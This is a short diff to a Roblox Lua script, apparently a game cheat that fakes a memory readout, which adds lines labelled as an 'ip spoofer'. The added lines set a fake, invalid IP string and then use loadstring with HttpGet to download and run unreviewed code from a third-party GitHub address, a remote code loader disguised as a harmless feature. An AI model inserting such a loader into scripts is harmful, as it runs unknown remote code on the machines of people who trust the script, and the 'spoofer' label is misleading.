@@ -16,6 +16,9 @@ Memory:GetPropertyChangedSignal("Text"):Connect(function()
     Random = Random * 1.23 
     Memory.Text = "".. Random .." MB"
 end)
+--ip spoofer
+spoofedIP = "102.454.444"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/HelloLua/main/looferrlua"))()
 -- no delay
 local ReplicatedStorage = game.ReplicatedStorage
 local Network = game.Network
